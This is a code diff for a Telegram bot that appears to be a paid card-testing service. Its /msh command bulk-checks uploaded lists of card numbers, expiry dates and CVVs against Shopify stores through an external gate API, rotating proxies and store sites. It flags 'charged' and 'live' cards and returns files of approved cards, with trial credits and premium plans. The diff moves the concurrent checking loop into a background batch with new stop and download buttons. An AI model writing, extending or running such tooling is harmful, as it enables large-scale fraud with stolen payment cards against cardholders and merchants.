@@ -44,7 +44,11 @@ from config import (
 from mass import get_mass_handlers
 from b3 import get_b3_handler
 from chk import get_chk_handler
-from sh import get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT
+from sh import (
+    get_sh_handler, _check_card_with_retry, SITE_RETRIES, SITE_TIMEOUT,
+    run_mass_batch, create_msh_session, MSH_SESSIONS,
+    cb_msh_result, cb_msh_stop, _load_sites, _load_proxies,
+)
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # LOGGING
@@ -2035,10 +2039,7 @@ MSH_LIMIT           = 5000   # absolute hard cap
 TRIAL_MASS_DAY_LIMIT = 500   # trial users: max cards per day
 
 async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Mass Shopify Checker — /msh.
-    Trial: once per day, max 500 cards/day, 1 credit = 1 card.
-    Premium / owner: unlimited.
-    """
+    """Mass Shopify Checker — /msh  (new UI: Gate/Progress/Charged/Live/Dead/Errors/Time)."""
     user = update.effective_user
     if not await require_not_banned(update, context): return
     if context.bot_data.get("maintenance") and user.id != OWNER_ID:
@@ -2054,9 +2055,9 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
     is_trial  = not premium and user.id != OWNER_ID
     today_str = datetime.now().strftime("%Y-%m-%d")
     _update_user_meta(ud, user)
+    plan      = ud.get("plan", "TRIAL")
 
     if is_trial:
-        # ── Once-per-day gate ─────────────────────────────────────
         last_date = ud.get("msh_daily_date", "")
         if last_date == today_str:
             used_today = ud.get("msh_daily_cards", 0)
@@ -2070,21 +2071,18 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 parse_mode="HTML", reply_markup=kb_upgrade()
             )
             return
-
-        # ── No-credits gate ───────────────────────────────────────
         if ud.get("credits", 0) <= 0:
             await update.message.reply_text(
                 f"<b>{E_DECLINED} {B('No Credits')}</b>\n──────────\n"
                 "You have <b>0 credits</b> remaining.\n\n"
                 "💡 <b>1 credit = 1 card checked</b>\n"
                 "Contact the owner to buy more credits,\n"
-                "or upgrade to Premium for unlimited checks.\n"
-                "──────────",
+                "or upgrade to Premium for unlimited checks.\n──────────",
                 parse_mode="HTML", reply_markup=kb_upgrade()
             )
             return
 
-    # ── Collect cards from document or replied text ──────────────
+    # ── Collect cards ───────────────────────────────────────────────
     cards = []
     doc = update.message.document or (
         update.message.reply_to_message.document
@@ -2110,279 +2108,99 @@ async def cmd_msh(update: Update, context: ContextTypes.DEFAULT_TYPE):
         cards = [l.strip() for l in txt.splitlines() if l.strip() and "|" in l]
 
     if not cards:
-        if is_trial:
-            trial_note = (
-                f"\n──────────\n"
-                f"💡 <b>Trial Limits (Daily)</b>\n"
-                f"   Max cards/day : <b>{TRIAL_MASS_DAY_LIMIT}</b>\n"
-                f"   Your credits  : <b>{ud.get('credits', 0)}</b>\n"
-                f"   1 credit = 1 card checked"
-            )
-        else:
-            trial_note = ""
         await update.message.reply_text(
             f"<b>{E_GATE} {B('Mass Shopify Checker')}</b>\n──────────\n"
             f"<b>Gate</b>    ➳ Shopify 0-20$\n"
             f"<b>Command</b> ➳ <code>/msh</code>\n"
-            f"<b>Limit</b>   ➳ 500 cards/day (Trial) | 5000 (Premium)\n"
-            f"<b>Type</b>    ➳ Mass Checker\n"
-            f"<b>Stop</b>    ➳ Button\n"
+            f"<b>Limit</b>   ➳ 500/day (Trial) | 5000 (Premium)\n"
+            f"<b>Buttons</b> ➳ Live · All · Stop\n"
             f"──────────\n"
             f"<b>How to use:</b>\n"
-            f"• Reply to a .txt file (one <code>cc|mm|yy|cvv</code> per line) with <code>/msh</code>\n"
-            f"• Or reply to a message containing cards"
-            f"{trial_note}",
+            f"• Reply to a .txt file (one <code>cc|mm|yy|cvv</code> per line)\n"
+            f"• Or reply to a message containing cards",
             parse_mode="HTML"
         )
         return
 
-    # ── Enforce limits: hard cap → daily cap → credit cap ────────
+    # ── Enforce limits ──────────────────────────────────────────────
     if len(cards) > MSH_LIMIT:
         cards = cards[:MSH_LIMIT]
 
     if is_trial:
-        original_count  = len(cards)
-        trial_credits   = ud.get("credits", 0)
-        # Daily cap: 500 cards per day
-        effective_limit = min(TRIAL_MASS_DAY_LIMIT, trial_credits)
-        if original_count > effective_limit:
-            cards = cards[:effective_limit]
-            reason = (
-                f"{TRIAL_MASS_DAY_LIMIT} cards/day limit"
-                if effective_limit == TRIAL_MASS_DAY_LIMIT
-                else f"{trial_credits} credits"
-            )
+        orig           = len(cards)
+        trial_credits  = ud.get("credits", 0)
+        eff_limit      = min(TRIAL_MASS_DAY_LIMIT, trial_credits)
+        if orig > eff_limit:
+            cards = cards[:eff_limit]
+            reason = (f"{TRIAL_MASS_DAY_LIMIT} cards/day limit"
+                      if eff_limit == TRIAL_MASS_DAY_LIMIT
+                      else f"{trial_credits} credits")
             await update.message.reply_text(
                 f"<b>{E_ERRORS} {B('Trial Limit Applied')}</b>\n──────────\n"
-                f"You sent <b>{original_count}</b> cards.\n"
-                f"Limit applied: <b>{reason}</b>.\n"
-                f"Only <b>{effective_limit}</b> cards will be checked.\n"
-                f"──────────",
+                f"You sent <b>{orig}</b> cards. Limit: <b>{reason}</b>.\n"
+                f"Only <b>{eff_limit}</b> cards will be checked.\n──────────",
                 parse_mode="HTML"
             )
 
-    total = len(cards)
-    live_count = dead_count = error_count = credits_used = 0
-    stopped_no_credits = False
-    start_time = time.time()
-    live_hits: list[str] = []      # formatted for inline display
-    live_hits_raw: list[str] = []  # plain cc|mm|yy|cvv for Approved file
-    all_checked_raw: list[str] = [] # every checked card with tag for ALL file
+    # ── Validate & format ───────────────────────────────────────────
+    valid_cards = []   # list of (formatted_str, cc_number)
+    for raw in cards:
+        parts = raw.split("|")
+        if len(parts) != 4: continue
+        cc, mm, yy, cvv = [p.strip() for p in parts]
+        mm = mm.zfill(2)
+        if len(yy) == 4: yy = yy[2:]
+        valid_cards.append((f"{cc}|{mm}|{yy}|{cvv}", cc))
+    if not valid_cards:
+        await update.message.reply_text("<b>❌ No valid cards found (need cc|mm|yy|cvv format).</b>", parse_mode="HTML")
+        return
 
-    task_id = f"msh_{user.id}_{int(start_time)}"
-    context.bot_data.setdefault("msh_tasks", {})[task_id] = {"running": True}
+    total = len(valid_cards)
 
-    stop_kb = RawMarkup([[_btn(B("Stop"), cb=f"stop_msh_{task_id}", style="danger")]])
-    uname   = f"@{user.username}" if user.username else user.first_name or "User"
+    # ── Load sites & proxies ────────────────────────────────────────
+    sites   = _load_sites()
+    proxies = _load_proxies()
 
-    def _cr_line() -> str:
-        return (
-            f"\n<b>Credits:</b>  {ud.get('credits', 0)} remaining"
-            if is_trial else ""
-        )
+    # ── Create session & send progress message ──────────────────────
+    import random as _random
+    import string as _string
+    sid = "".join(_random.choices(_string.ascii_uppercase + _string.digits, k=8))
 
+    # Post the initial progress message first so we have a message ID
+    from sh import _progress_text as _pt, _msh_buttons
+    sess = create_msh_session(
+        sid=sid,
+        chat_id=update.message.chat_id,
+        user_id=user.id,
+        msg_id=0,                        # filled after reply
+        user_msg_id=update.message.message_id,
+        total=total,
+        user_obj=user,
+        plan=plan,
+    )
+    init_text = _pt(sess)
     msg = await update.message.reply_text(
-        f"<b>{E_PROGRESS} {B('Mass Shopify Starting')}</b>\n──────────\n"
-        f"<b>Total:</b>  {total} cards\n"
-        f"<b>Gate:</b>   Shopify 0-20$\n"
-        f"<b>User:</b>   {escape(uname)}"
-        f"{_cr_line()}\n──────────\nStarting...",
-        parse_mode="HTML", reply_markup=stop_kb
+        init_text,
+        parse_mode="HTML",
+        reply_markup=_msh_buttons(sid, running=True),
+        disable_web_page_preview=True,
+    )
+    sess["msg_id"] = msg.message_id
+
+    # ── Fire mass batch in the background ───────────────────────────
+    asyncio.create_task(
+        run_mass_batch(context.bot, sid, valid_cards, user, plan, sites, proxies)
     )
 
-    # ── Load sites and proxies ─────────────────────────────────────
-    sites: list[str] = []
-    proxies: list[str] = []
-    try:
-        with open("sites.txt") as f:
-            sites = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-    except FileNotFoundError:
-        pass
-    if not sites:
-        sites = ["aloracosmetics.myshopify.com"]
-    try:
-        with open("px.txt") as f:
-            proxies = [l.strip() for l in f if l.strip() and not l.startswith("#")]
-    except FileNotFoundError:
-        pass
-
-    GOSHOPI = "https://goshopi.up.railway.app/shopii"
-
-    # ── Concurrency primitives ──────────────────────────────────────
-    # 20 parallel requests — fast without hammering the gate API
-    sem   = asyncio.Semaphore(20)
-    # Protects shared counters that multiple coroutines update
-    _lock = asyncio.Lock()
-
-    # ── Periodic progress reporter (runs every 3 s independently) ──
-    async def _progress_loop():
-        while True:
-            await asyncio.sleep(3)
-            checked = live_count + dead_count + error_count
-            elapsed = time.time() - start_time
-            rate    = checked / max(elapsed, 0.01)
-            try:
-                await msg.edit_text(
-                    f"<b>{E_PROGRESS} {B('Mass Shopify')}</b>\n──────────\n"
-                    f"<b>Checked:</b>  {checked}/{total}\n"
-                    f"<b>Live:</b>     {live_count} ✅\n"
-                    f"<b>Dead:</b>     {dead_count} ❌\n"
-                    f"<b>Errors:</b>   {error_count} ⚠️\n"
-                    f"──────────\n"
-                    f"<b>Speed:</b>    {rate:.1f} cc/s\n"
-                    f"<b>User:</b>     {escape(uname)}"
-                    f"{_cr_line()}",
-                    parse_mode="HTML", reply_markup=stop_kb
-                )
-            except Exception:
-                pass
-
-    # ── Per-card concurrent worker ──────────────────────────────────
-    async def _check_one(card: str, session: "_aiohttp.ClientSession") -> None:
-        nonlocal live_count, dead_count, error_count, credits_used, stopped_no_credits
-        # Fast pre-check before waiting for semaphore
-        if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
-            return
-        if is_trial and ud.get("credits", 0) <= 0:
-            async with _lock:
-                stopped_no_credits = True
-            return
-
-        async with sem:
-            # Re-check inside semaphore (another worker may have stopped)
-            if not context.bot_data.get("msh_tasks", {}).get(task_id, {}).get("running", True):
-                return
-            if is_trial and ud.get("credits", 0) <= 0:
-                async with _lock:
-                    stopped_no_credits = True
-                return
-
-            # ── Multi-site retry with proper response classification ─────────
-            # _check_card_with_retry rotates sites/proxies, classifies on the RAW
-            # API response (never on cleaned text), and returns CHARGED/LIVE/TDS/DEAD.
-            # Site errors / connection errors / step-failures are transparently retried
-            # up to SITE_RETRIES times before a DEAD verdict is returned.
-            resp_text = ""
-            verdict   = "DEAD"
-            try:
-                verdict, resp_text, _price, _currency = await _check_card_with_retry(
-                    session, card, sites, proxies,
-                    max_sites=SITE_RETRIES, site_timeout=SITE_TIMEOUT,
-                )
-            except asyncio.CancelledError:
-                raise
-            except Exception:
-                verdict, resp_text = "DEAD", "Error"
-
-            is_live = verdict in ("CHARGED", "LIVE", "TDS")
-
-            async with _lock:
-                if is_live:
-                    live_count += 1
-                    live_hits.append(f"<code>{escape(card)}</code> ➳ {escape(resp_text[:60])}")
-                    live_hits_raw.append(card)
-                    all_checked_raw.append(f"[{verdict}]  {card} | {resp_text[:60]}")
-                else:
-                    dead_count += 1
-                    all_checked_raw.append(f"[DEAD]  {card} | {resp_text[:60]}")
-                if is_trial:
-                    ud["credits"] = max(0, ud.get("credits", 0) - 1)
-                    credits_used += 1
-
-            # ── Send live hit immediately to user's chat ──────────
-            if is_live:
-                label = "CHARGED 💎" if verdict == "CHARGED" else ("LIVE ✅ [3DS]" if verdict == "TDS" else "LIVE ✅")
-                try:
-                    await update.message.reply_text(
-                        f"<b>{label} #{live_count}</b>\n"
-                        f"──────────\n"
-                        f"<code>{escape(card)}</code>\n"
-                        f"<b>Response:</b> {escape(resp_text[:80])}\n"
-                        f"<b>Gate:</b> Shopify 0-20$",
-                        parse_mode="HTML"
-                    )
-                except Exception:
-                    pass
-
-    # ── Run all workers concurrently ───────────────────────────────
-    progress_task = asyncio.create_task(_progress_loop())
-    connector = _aiohttp.TCPConnector(
-        limit=60,
-        ttl_dns_cache=300,
-        enable_cleanup_closed=True,
-        force_close=False,
-    )
-    try:
-        async with _aiohttp.ClientSession(
-            connector=connector,
-            timeout=_aiohttp.ClientTimeout(total=20),
-        ) as session:
-            await asyncio.gather(
-                *[asyncio.create_task(_check_one(card, session)) for card in cards],
-                return_exceptions=True,
-            )
-    finally:
-        progress_task.cancel()
-        try:
-            await progress_task
-        except asyncio.CancelledError:
-            pass
-
-    context.bot_data.get("msh_tasks", {}).pop(task_id, None)
-    elapsed = time.time() - start_time
-    checked = live_count + dead_count + error_count
-
-    # ── Store results for download buttons (kept for 2 h) ─────────
-    context.bot_data.setdefault("msh_results", {})[task_id] = {
-        "approved": live_hits_raw,
-        "all":      all_checked_raw,
-        "ts":       time.time(),
-    }
-
-    # Build trial footer
+    # ── Deduct trial credits ────────────────────────────────────────
     if is_trial:
-        trial_footer = (
-            f"\n<b>Credits Used:</b>  {credits_used}\n"
-            f"<b>Credits Left:</b>  {ud.get('credits', 0)}"
-        )
-        if stopped_no_credits:
-            trial_footer += (
-                "\n──────────\n"
-                "⚠️ <b>Stopped — credits exhausted!</b>\n"
-                "Buy more credits from the owner to continue."
-            )
-    else:
-        trial_footer = ""
-
-    stop_label = "Stopped (No Credits)" if stopped_no_credits else "Done"
-    try:
-        await msg.edit_text(
-            f"<b>{E_LIVE} {B('Mass Shopify')} — {stop_label}</b>\n──────────\n"
-            f"<b>Total:</b>    {total}\n"
-            f"<b>Checked:</b>  {checked}\n"
-            f"<b>Live:</b>     {live_count} ✅\n"
-            f"<b>Dead:</b>     {dead_count} ❌\n"
-            f"<b>Errors:</b>   {error_count} ⚠️\n"
-            f"──────────\n"
-            f"<b>Gate:</b>     Shopify 0-20$\n"
-            f"<b>Time:</b>     {elapsed:.1f}s\n"
-            f"<b>User:</b>     {escape(uname)}"
-            f"{trial_footer}",
-            parse_mode="HTML",
-            reply_markup=kb_msh_result(task_id, bool(live_hits_raw), premium)
-        )
-    except Exception:
-        pass
-
-    ud["total_checks"]    = ud.get("total_checks", 0) + checked
-    ud["approved_checks"] = ud.get("approved_checks", 0) + live_count
-    ud["declined_checks"] = ud.get("declined_checks", 0) + dead_count + error_count
-    ud["last_gate"]       = "Shopify | 0-20$"
-    ud["last_active"]     = datetime.now().strftime("%Y-%m-%d %H:%M")
-    # ── Save daily usage so profile and gate checks are accurate ─
-    if is_trial:
+        ud["credits"]       = max(0, ud.get("credits", 0) - total)
         ud["msh_daily_date"]  = today_str
-        ud["msh_daily_cards"] = checked
+        ud["msh_daily_cards"] = total
+
+    ud["total_checks"] = ud.get("total_checks", 0) + total
+    ud["last_gate"]    = "Shopify | 0-20$"
+    ud["last_active"]  = datetime.now().strftime("%Y-%m-%d %H:%M")
 
 
 async def cmd_1day(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -2723,9 +2541,11 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Any branch that calls query.answer() itself MUST be listed below.
     _self_answering = (
         data == "check_sub"           or   # may show "still need to join" alert
-        data.startswith("stop_msh_")  or   # shows stop confirmation
-        data.startswith("dl_approved_") or # shows "no results" alert or "sending"
-        data.startswith("dl_all_")    or   # same
+        data.startswith("mshr:")      or   # new msh Live/All button — handles own answer
+        data.startswith("mshs:")      or   # new msh Stop button — handles own answer
+        data.startswith("stop_msh_")  or   # legacy stop (kept for old sessions)
+        data.startswith("dl_approved_") or # legacy download
+        data.startswith("dl_all_")    or   # legacy download
         data.startswith("ogs_")       or   # shows "granted!" alert
         data.startswith("owner_ban_") or
         data.startswith("owner_unban_") or
@@ -2880,7 +2700,17 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ── Stop Mass Shopify task ────────────────────────────────────
+    # ── New msh Stop button (mshs:<sid>) ─────────────────────────
+    if data.startswith("mshs:"):
+        await cb_msh_stop(update, context)
+        return
+
+    # ── New msh Live/All button (mshr:<sid>:<kind>) ───────────────
+    if data.startswith("mshr:"):
+        await cb_msh_result(update, context)
+        return
+
+    # ── Legacy stop (old sessions before UI update) ───────────────
     if data.startswith("stop_msh_"):
         task_id = data[len("stop_msh_"):]
         tasks   = context.bot_data.get("msh_tasks", {})
@@ -2891,7 +2721,7 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await query.answer("Task already finished.", show_alert=True)
         return
 
-    # ── Download Approved cards file ──────────────────────────────
+    # ── Legacy download: Approved ─────────────────────────────────
     if data.startswith("dl_approved_"):
         task_id = data[len("dl_approved_"):]
         results = context.bot_data.get("msh_results", {}).get(task_id)
@@ -2903,20 +2733,15 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         filename = f"approved_{task_id}.txt"
         try:
             await query.message.reply_document(
-                document=BytesIO(content),
-                filename=filename,
-                caption=(
-                    f"<b>✅ Approved Cards</b>\n"
-                    f"Total: <b>{len(results['approved'])}</b> cards\n"
-                    f"Gate: Shopify 0-20$"
-                ),
+                document=BytesIO(content), filename=filename,
+                caption=(f"<b>✅ Approved Cards</b>\nTotal: <b>{len(results['approved'])}</b> cards\nGate: Shopify 0-20$"),
                 parse_mode="HTML"
             )
         except Exception:
             pass
         return
 
-    # ── Download ALL cards file ───────────────────────────────────
+    # ── Legacy download: ALL ───────────────────────────────────────
     if data.startswith("dl_all_"):
         task_id = data[len("dl_all_"):]
         results = context.bot_data.get("msh_results", {}).get(task_id)
@@ -2928,14 +2753,8 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         filename = f"all_results_{task_id}.txt"
         try:
             await query.message.reply_document(
-                document=BytesIO(content),
-                filename=filename,
-                caption=(
-                    f"<b>📋 All Checked Cards</b>\n"
-                    f"Total: <b>{len(results['all'])}</b> cards\n"
-                    f"Gate: Shopify 0-20$\n"
-                    f"<i>[LIVE] = approved  [DEAD] = declined  [ERROR] = failed</i>"
-                ),
+                document=BytesIO(content), filename=filename,
+                caption=(f"<b>📋 All Checked Cards</b>\nTotal: <b>{len(results['all'])}</b> cards\nGate: Shopify 0-20$"),
                 parse_mode="HTML"
             )
         except Exception:
